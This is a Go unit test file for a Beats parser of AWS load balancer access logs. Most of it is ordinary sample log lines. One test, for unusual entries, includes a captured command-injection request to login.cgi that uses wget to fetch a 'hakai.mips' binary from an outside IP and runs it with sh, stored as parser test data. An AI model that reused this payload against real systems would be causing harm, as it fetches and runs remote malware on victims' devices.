// +build !integration

package parser

import (
	"testing"
	"time"

	"github.com/elastic/beats/libbeat/beat"
	"github.com/elastic/beats/libbeat/common"
)

// Examples present here have been obtained from: https://docs.aws.amazon.com/es_es/elasticloadbalancing/latest/application/load-balancer-access-logs.html
func TestS3ALBLogParser(t *testing.T) {
	logs := `http 2016-08-10T22:08:42.945958Z app/my-loadbalancer/50dc6c495c0c9188 192.168.131.39:2817 10.0.0.1:80 0.000 0.001 0.000 200 200 34 366 "GET http://www.example.com:80/ HTTP/1.1" "curl/7.46.0" - - arn:aws:elasticloadbalancing:us-east-2:123456789012:targetgroup/my-targets/73e2d6bc24d8a067 "Root=1-58337262-36d228ad5d99923122bbe354" - -
https 2016-08-10T23:39:43.065466Z app/my-loadbalancer/50dc6c495c0c9188 192.168.131.39:2817 10.0.0.1:80 0.086 0.048 0.037 200 200 0 57 "GET https://www.example.com:443/ HTTP/1.1" "curl/7.46.0" ECDHE-RSA-AES128-GCM-SHA256 TLSv1.2 arn:aws:elasticloadbalancing:us-east-2:123456789012:targetgroup/my-targets/73e2d6bc24d8a067 "Root=1-58337281-1d84f3d73c47ec4e58577259" www.example.com arn:aws:acm:us-east-2:123456789012:certificate/12345678-1234-1234-1234-123456789012
h2 2016-08-10T00:10:33.145057Z app/my-loadbalancer/50dc6c495c0c9188 10.0.1.252:48160 10.0.0.66:9000 0.000 0.002 0.000 200 200 5 257 "GET https://10.0.2.105:773/ HTTP/2.0" "curl/7.46.0" ECDHE-RSA-AES128-GCM-SHA256 TLSv1.2 arn:aws:elasticloadbalancing:us-east-2:123456789012:targetgroup/my-targets/73e2d6bc24d8a067 "Root=1-58337327-72bd00b0343d75b906739c42" - -
ws 2016-08-10T00:32:08.923954Z app/my-loadbalancer/50dc6c495c0c9188 10.0.0.140:40914 10.0.1.192:8010 0.001 0.003 0.000 101 101 218 587 "GET http://10.0.0.30:80/ HTTP/1.1" "-" - - arn:aws:elasticloadbalancing:us-east-2:123456789012:targetgroup/my-targets/73e2d6bc24d8a067 "Root=1-58337364-23a8c76965a2ef7629b185e3" - -
wss 2016-08-10T00:42:46.423695Z app/my-loadbalancer/50dc6c495c0c9188 10.0.0.140:44244 10.0.0.171:8010 0.000 0.001 0.000 101 101 218 786 "GET https://10.0.0.30:443/ HTTP/1.1" "-" ECDHE-RSA-AES128-GCM-SHA256 TLSv1.2 arn:aws:elasticloadbalancing:us-west-2:123456789012:targetgroup/my-targets/73e2d6bc24d8a067 "Root=1-58337364-23a8c76965a2ef7629b185e3" - -`
	expected := []*beat.Event{
		&beat.Event{
			Timestamp: time.Date(2016, 8, 10, 22, 8, 42, 945958000, time.UTC),
			Fields: common.MapStr{
				"type":                     "http",
				"elb":                      "app/my-loadbalancer/50dc6c495c0c9188",
				"client_ip":                "192.168.131.39",
				"client_port":              uint16(2817),
				"target_ip":                "10.0.0.1",
				"target_port":              uint16(80),
				"request_processing_time":  0.000,
				"target_processing_time":   0.001,
				"response_processing_time": 0.000,
				"elb_status_code":          int16(200),
				"target_status_code":       int16(200),
				"received_bytes":           int64(34),
				"sent_bytes":               int64(366),
				"request_verb":             "GET",
				"request_url":              "http://www.example.com:80/",
				"request_proto":            "HTTP/1.1",
				"user_agent":               "curl/7.46.0",
				"target_group_arn":         "arn:aws:elasticloadbalancing:us-east-2:123456789012:targetgroup/my-targets/73e2d6bc24d8a067",
				"trace_id":                 "Root=1-58337262-36d228ad5d99923122bbe354",
			},
		},
		&beat.Event{
			Timestamp: time.Date(2016, 8, 10, 23, 39, 43, 65466000, time.UTC),
			Fields: common.MapStr{
				"type":                     "https",
				"elb":                      "app/my-loadbalancer/50dc6c495c0c9188",
				"client_ip":                "192.168.131.39",
				"client_port":              uint16(2817),
				"target_ip":                "10.0.0.1",
				"target_port":              uint16(80),
				"request_processing_time":  0.086,
				"target_processing_time":   0.048,
				"response_processing_time": 0.037,
				"elb_status_code":          int16(200),
				"target_status_code":       int16(200),
				"received_bytes":           int64(0),
				"sent_bytes":               int64(57),
				"request_verb":             "GET",
				"request_url":              "https://www.example.com:443/",
				"request_proto":            "HTTP/1.1",
				"user_agent":               "curl/7.46.0",
				"ssl_cipher":               "ECDHE-RSA-AES128-GCM-SHA256",
				"ssl_protocol":             "TLSv1.2",
				"target_group_arn":         "arn:aws:elasticloadbalancing:us-east-2:123456789012:targetgroup/my-targets/73e2d6bc24d8a067",
				"trace_id":                 "Root=1-58337281-1d84f3d73c47ec4e58577259",
			},
		},
		&beat.Event{
			Timestamp: time.Date(2016, 8, 10, 00, 10, 33, 145057000, time.UTC),
			Fields: common.MapStr{
				"type":                     "h2",
				"elb":                      "app/my-loadbalancer/50dc6c495c0c9188",
				"client_ip":                "10.0.1.252",
				"client_port":              uint16(48160),
				"target_ip":                "10.0.0.66",
				"target_port":              uint16(9000),
				"request_processing_time":  0.000,
				"target_processing_time":   0.002,
				"response_processing_time": 0.000,
				"elb_status_code":          int16(200),
				"target_status_code":       int16(200),
				"received_bytes":           int64(5),
				"sent_bytes":               int64(257),
				"request_verb":             "GET",
				"request_url":              "https://10.0.2.105:773/",
				"request_proto":            "HTTP/2.0",
				"user_agent":               "curl/7.46.0",
				"ssl_cipher":               "ECDHE-RSA-AES128-GCM-SHA256",
				"ssl_protocol":             "TLSv1.2",
				"target_group_arn":         "arn:aws:elasticloadbalancing:us-east-2:123456789012:targetgroup/my-targets/73e2d6bc24d8a067",
				"trace_id":                 "Root=1-58337327-72bd00b0343d75b906739c42",
			},
		},
		&beat.Event{
			Timestamp: time.Date(2016, 8, 10, 00, 32, 8, 923954000, time.UTC),
			Fields: common.MapStr{
				"type":                     "ws",
				"elb":                      "app/my-loadbalancer/50dc6c495c0c9188",
				"client_ip":                "10.0.0.140",
				"client_port":              uint16(40914),
				"target_ip":                "10.0.1.192",
				"target_port":              uint16(8010),
				"request_processing_time":  0.001,
				"target_processing_time":   0.003,
				"response_processing_time": 0.000,
				"elb_status_code":          int16(101),
				"target_status_code":       int16(101),
				"received_bytes":           int64(218),
				"sent_bytes":               int64(587),
				"request_verb":             "GET",
				"request_url":              "http://10.0.0.30:80/",
				"request_proto":            "HTTP/1.1",
				"target_group_arn":         "arn:aws:elasticloadbalancing:us-east-2:123456789012:targetgroup/my-targets/73e2d6bc24d8a067",
				"trace_id":                 "Root=1-58337364-23a8c76965a2ef7629b185e3",
			},
		},
		&beat.Event{
			Timestamp: time.Date(2016, 8, 10, 00, 42, 46, 423695000, time.UTC),
			Fields: common.MapStr{
				"type":                     "wss",
				"elb":                      "app/my-loadbalancer/50dc6c495c0c9188",
				"client_ip":                "10.0.0.140",
				"client_port":              uint16(44244),
				"target_ip":                "10.0.0.171",
				"target_port":              uint16(8010),
				"request_processing_time":  0.000,
				"target_processing_time":   0.001,
				"response_processing_time": 0.000,
				"elb_status_code":          int16(101),
				"target_status_code":       int16(101),
				"received_bytes":           int64(218),
				"sent_bytes":               int64(786),
				"request_verb":             "GET",
				"request_url":              "https://10.0.0.30:443/",
				"request_proto":            "HTTP/1.1",
				"ssl_cipher":               "ECDHE-RSA-AES128-GCM-SHA256",
				"ssl_protocol":             "TLSv1.2",
				"target_group_arn":         "arn:aws:elasticloadbalancing:us-west-2:123456789012:targetgroup/my-targets/73e2d6bc24d8a067",
				"trace_id":                 "Root=1-58337364-23a8c76965a2ef7629b185e3",
			},
		},
	}
	errorLinesExpected := []string{}
	AssertLogParser(t, S3ALBLogParser, &logs, expected, errorLinesExpected)
}

func TestS3ALBLogParserStrangeEntries(t *testing.T) {
	logs := `http 2018-08-19T15:14:55.207720Z app/my-loadbalancer/50dc6c495c0c9188 41.233.25.52:58750 - -1 -1 -1 400 - 211 288 "GET http://www.example.com:80/login.cgi?cli=aa%20aa%27;wget%20http://1.2.3.4/hakai.mips%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" "Hakai/2.0" - - - "-" "-" "-" - 2018-08-19T15:14:55.205000Z "-" "-"`
	expected := []*beat.Event{
		&beat.Event{
			Timestamp: time.Date(2018, 8, 19, 15, 14, 55, 207720000, time.UTC),
			Fields: common.MapStr{
				"type":            "http",
				"elb":             "app/my-loadbalancer/50dc6c495c0c9188",
				"client_ip":       "41.233.25.52",
				"client_port":     uint16(58750),
				"elb_status_code": int16(400),
				"received_bytes":  int64(211),
				"sent_bytes":      int64(288),
				"request_verb":    "GET",
				"request_url":     "http://www.example.com:80/login.cgi?cli=aa aa';wget http://1.2.3.4/hakai.mips -O -> /tmp/hk;sh /tmp/hk'$",
				"request_proto":   "HTTP/1.1",
				"user_agent":      "Hakai/2.0",
			},
		},
	}
	errorLinesExpected := []string{}
	AssertLogParser(t, S3ALBLogParser, &logs, expected, errorLinesExpected)
}
